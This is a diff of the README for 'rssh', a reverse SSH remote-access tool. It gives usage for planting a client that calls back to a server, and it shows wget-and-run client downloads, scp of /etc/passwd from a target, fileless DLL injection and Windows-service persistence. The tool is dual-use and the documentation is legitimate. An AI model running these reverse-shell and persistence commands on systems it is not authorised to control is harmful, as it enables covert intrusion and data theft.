@@ -50,13 +50,13 @@ cp ~/.ssh/id_ed25519.pub authorized_keys
 ./server 0.0.0.0:3232
 
 # copy client to your target then connect to the server
-./client attackerhost.com:3232
+./client your.rssh.server.com:3232
 
 # Get help text
-ssh localhost -p 3232 help
+ssh your.rssh.server.com -p 3232 help
 
 # See clients
-ssh localhost -p 3232 ls -t
+ssh your.rssh.server.com -p 3232 ls -t
 
                                 Targets
 +------------------------------------------+------------+-------------+
@@ -67,11 +67,11 @@ ssh localhost -p 3232 ls -t
 
 
 # Connect to full shell
-ssh -J localhost:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac
+ssh -J your.rssh.server.com:3232 0f6ffecb15d75574e5e955e014e0546f6e2851ac
 
 # Or using hostname 
 
-ssh -J localhost:3232 root.wombo
+ssh -J your.rssh.server.com:3232 root.wombo
 
 ```
 
@@ -106,13 +106,13 @@ cp ~/.ssh/id_ed25519.pub authorized_keys
 Put the client binary on whatever you want to control, then connect to the server.
 
 ```sh
-./client yourserver.com:3232
+./client your.rssh.server.com:3232
 ```
 
 You can then see what reverse shells have connected to you using `ls`:
 
 ```sh
-ssh yourserver.com -p 3232 ls
+ssh your.rssh.server.com -p 3232 ls -t
                                 Targets
 +------------------------------------------+------------+-------------+
 | ID                                       | Hostname   | IP Address  |
@@ -126,19 +126,22 @@ Then typical ssh commands work, just specify your rssh server as a jump host.
 
 ```sh
 # Connect to full shell
-ssh -J youserver.com:3232 root.wombo
+ssh -J your.rssh.server.com:3232 root.wombo
 
 # Run a command without pty
-ssh -J youserver.com:3232 root.wombo ls
+ssh -J your.rssh.server.com:3232 root.wombo help
 
 # Start remote forward 
-ssh -R 1234:localhost:1234 -J youserver.com:3232 root.wombo ls
+ssh -R 1234:localhost:1234 -J your.rssh.server.com:3232 root.wombo
 
 # Start dynamic forward 
-ssh -D 9050 -J youserver.com:3232 root.wombo ls
+ssh -D 9050 -J your.rssh.server.com:3232 root.wombo
 
 # SCP 
-scp -J youserver.com:3232 root.wombo:/etc/passwd .
+scp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .
+
+#SFTP
+sftp -J your.rssh.server.com:3232 root.wombo:/etc/passwd .
 
 ```
 
@@ -149,13 +152,13 @@ scp -J youserver.com:3232 root.wombo:/etc/passwd .
 Specify a default server at build time:
 
 ```sh
-$ RSSH_HOMESERVER=localhost:1234 make
+$ RSSH_HOMESERVER=your.rssh.server.com:3232 make
 
-# Will connect to localhost:1234, even though no destination is specified
+# Will connect to your.rssh.server.com:3232, even though no destination is specified
 $ bin/client
 
-# Behaviour is otherwise normal; will connect to example.com:1234
-$ bin/client example.com:1234
+# Behaviour is otherwise normal; will connect to the supplied host, e.g example.com:3232
+$ bin/client example.com:3232
 ```
 
 ### Built in Web Server
@@ -163,10 +166,10 @@ $ bin/client example.com:1234
 The RSSH server can also run an HTTP server on the same port as the RSSH server listener which serves client binaries.  The server must be placed in the project `bin/` folder, as it needs to find the client source.
 
 ```sh
-./server --webserver :1234
+./server --webserver :3232
 
 # Generate an unnamed link
-ssh 192.168.122.1 -p 1234
+ssh your.rssh.server.com -p 3232
 
 catcher$ link -h
 
@@ -185,14 +188,14 @@ This requires the web server component has been enabled.
 
 # Build a client binary
 catcher$ link --name test
-http://192.168.122.1:1234/test
+http://your.rssh.server.com:3232/test
 
 ```
 
 Then you can download it as follows:
 
 ```sh
-wget http://192.168.122.1:1234/test
+wget http://your.rssh.server.com:3232/test
 chmod +x test
 ./test
 ```
@@ -208,16 +211,44 @@ CC=x86_64-w64-mingw32-gcc GOOS=windows RSSH_HOMESERVER=192.168.1.1:2343 make cli
 When the RSSH server has the webserver enabled you can also compile it with the link command: 
 
 ```
-./server --webserver :1234
+./server --webserver :3232
 
 # Generate an unnamed link
-ssh 192.168.122.1 -p 1234
+ssh your.rssh.server.com -p 3232
 
 catcher$ link --name windows_dll --shared-object --goos windows
-http://192.168.122.1:1234/windows_dll
+http://your.rssh.server.com:3232/windows_dll
 ```
 
 Which is useful when you want to do fileless injection of the rssh client. 
+
+### SSH Subsystem
+
+The SSH ecosystem allowsy out define and call subsystems with the `-s` flag. In RSSH this is repurposed to provide special commands for platforms. 
+
+
+#### All
+`list`  Lists avaiable subsystem
+`sftp`: Runs the sftp handler to transfer files
+
+#### Linux
+`setgid`:   Attempt to change group
+`setuid`:   Attempt to change user
+
+#### Windows
+`service`: Installs or removes the rssh binary as a windows service, requires administrative rights
+
+
+e.g
+
+```
+# Install the rssh binary as a service (windows only)
+ssh -J certainlyawesome.com:8080 test-pc.user.test-pc -s service --install
+```
+
+### Windows Service Integration
+
+The client RSSH binary supports being run within a windows service and wont time out after 10 seconds. This is great for creating persistent management services. 
 
 ### Full Windows Shell Support
 
